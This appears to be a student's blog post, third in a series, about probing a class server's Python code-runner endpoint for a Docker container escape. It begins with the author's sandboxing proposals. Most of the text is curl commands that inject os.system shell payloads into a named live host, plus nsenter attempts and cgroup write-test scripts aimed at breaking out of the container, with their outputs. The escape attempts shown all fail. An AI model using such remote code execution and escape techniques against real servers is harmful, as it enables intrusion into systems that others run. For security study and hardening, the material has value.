+++
title = "Smashing Mort's Server for Fun and No Profit 3"
description = "Since I'm bored, let's try some Docker escapes"
date = 2026-01-04
+++

After "RCE exploits" (if you can even call it that since it was pretty much intended), I proposed some potential solutions I'd be interesting in working on:

> Regarding the python code runner (`python_exec_api`), is the intention of this endpoint to allow users to run python snippets on other FE webpages (like the JS iframes)? If so, I was thinking of considering a few options:
> 
> 1. `gVisor`, running each execution inside a gVisor isolated container, which would protect against syscall stuff and is pretty well maintained. However, it does come with some computational cost. This would be appropriate if we are expecting Python interaction with the filesystem.
> 
> 2. `pyodide` (Python --> WASM); so that would be executing Python entirely in the browser or a WASM runtime. This basically eliminated server-side risk and simplifies isolationn efforts, but does come with some performance costs and I/O overhead. This would definitely be the better option for lightweight, educational snippets rather than general execution.
> 
> 3. `RestrictedPython` comes with some security enforcement of python (preventing syscalls and whatnot). This is simpler operationally, but relies on securing the language rather than sandboxxing, which could still allow for some exploits.
> 
> Given what I think the code runner will be used for (running simple snippets for education), I think `pyodide` would be the best option and would just include a `.js` file to load scripts and generate the editors (which I think there already is template for in `pages`).
>
> — <cite>Me, 7:49 PM PST 01-04-2026</cite>

But, there actually was already something in the works to mitigate this issue according to Mr. Mort:

> The other option is having an endpoint in a Docker container that has no sensitive info.  We have a systems team in CSA I will assign to do this.
>
> — <cite>Mr. Mortensen, 8:32 PM PST 01-04-2026</cite>

I thought this approach would still leave a few gaps and things to be desired. So, I began thinking of a simple way to prove this. In Mr. Mort's approach by placing the endpoint in its own API and Docker container, the RCE would still technically exist but without as much attack surface, so I figured I'd try finding a really simple container escape. 

## Let's Get Smashing

I first wanted to check `CAP`s because that tends to be misconfigured. 

> [!NOTE]
> This is before CSA actually made the change, so all of these exploits are currently running on the original Docker container, but assuming that the other implementations have the same flaws, then most of these will probably work.

Since the code runner endpoint was still open, I ran a query to probe the Docker image to capabilities:

```sh
curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import os; os.system(\"cat /proc/self/status | grep Cap\");"}'
```

I ended up receiving this output:
```
CapInh:	0000000000000000
CapPrm:	00000000a80425fb
CapEff:	00000000a80425fb
CapBnd:	00000000a80425fb
CapAmb:	0000000000000000
```

and so I ran a simple decode with `capsh`:

```sh
➜ capsh --decode=00000000a80425
0x0000000000a80425=cap_chown,cap_dac_read_search,cap_kill,cap_net_bind_service,cap_sys_ptrace,cap_sys_admin,cap_sys_nice
```

Woah! The Docker image was ran using with a `cap_sys_admin` capability which provides a pretty big attack surface for me to mess with.


## Scouting

My first idea was to try reading via `/proc/1/root/`, but the container root only points to itself:

```sh
➜ curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import os; os.system(\"cat /etc/hostname\")"}'
{"output": "c92464b7f96a\n"}

➜ curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import os; os.system(\"cat /proc/1/root/etc/hostname\")"}'
{"output": "c92464b7f96a\n"}
```

I then though about using mounts to mount the host filesystem and read it, but it seems that `seccomp` was blocking the mount syscall (hence `Seccomp: 2`):

```sh
➜ curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d '{"code": "import os; os.system(\"cat /proc/self/status | grep Seccomp\")"}'
{"output": "Seccomp:\t2\nSeccomp_filters:\t1\n"}
```

I then thought about using `nsenter` to run commands in namespaces, but `seccomp` is also blocking the `setns()` syscall that `nsenter` uses:

```sh
➜ curl -X POST https://flask.opencodingsociety.com/run/python \                                        -H "Content-Type: application/json" \
-d '{"code": "import os; os.system(\"nsenter -t 1 -m cat /etc/hostname 2>&1\")"}'
{"output": "nsenter: reassociate to namespaces failed: Operation not permitted\n"}
```

I then moved on to trying the classic `cgroup` attack vectors:

```py,linenos,name=cgroups.py
import os

cgroup_base = "/sys/fs/cgroup"

test_files = [
    "cgroup.subtree_control",
    "cgroup.procs",
    "memory.high",
    "cpu.weight",
]

print("[!] Testing write access to cgroup files")
for test_file in test_files:
    path = f"{cgroup_base}/{test_file}"
    if not os.path.exists(path):
        continue

    try:
        # Try to read first
        with open(path, "r") as f:
            content = f.read().strip()

        # Try to write the same content back
        try:
            with open(path, "w") as f:
                f.write(content if content else "")
            print(f"[!] {test_file} - WRITABLE")
            print(f"[!] Current: {content[:50]}")
        except PermissionError:
            print(f"[X] {test_file} - read-only")
        except Exception as e:
            print(f"[X] {test_file} - {e}")
    except Exception as e:
        print(f"[X] {test_file} - cannot read: {e}")
```

```sh
➜ mataiodoxion flask python code2json.py cgroups.py --compact | curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d @-
```

```
[!] Testing write access to cgroup files
[X] cgroup.subtree_control - [Errno 30] Read-only file system: '/sys/fs/cgroup/cgroup.subtree_control'
[X] cgroup.procs - [Errno 30] Read-only file system: '/sys/fs/cgroup/cgroup.procs'
[X] memory.high - [Errno 30] Read-only file system: '/sys/fs/cgroup/memory.high'
[X] cpu.weight - [Errno 30] Read-only file system: '/sys/fs/cgroup/cpu.weight'
```

And also trying to create new `cgroups`:

```py,linenos,name=cgroups_new.py
import os

cgroup_base = "/sys/fs/cgroup"

try:
    test_cgroup = f"{cgroup_base}/escape_test"
    os.makedirs(test_cgroup, exist_ok=True)
    print(f"[!] Created {test_cgroup}")

    # Check if notify_on_release exists in v2
    files_created = os.listdir(test_cgroup)
    print(f"[!] Files in new cgroup: {files_created[:5]}")

    # Clean up
    os.rmdir(test_cgroup)
    print("[!] Cleaned up test cgroup")
except Exception as e:
    print(f"[X] Cannot create cgroup: {e}")
```

```sh
➜ python code2json.py cgroups_new.py --compact | curl -X POST https://flask.opencodingsociety.com/run/python \
-H "Content-Type: application/json" \
-d @-
```

```
[X] Cannot create cgroup: [Errno 30] Read-only file system: '/sys/fs/cgroup/escape_test'
```
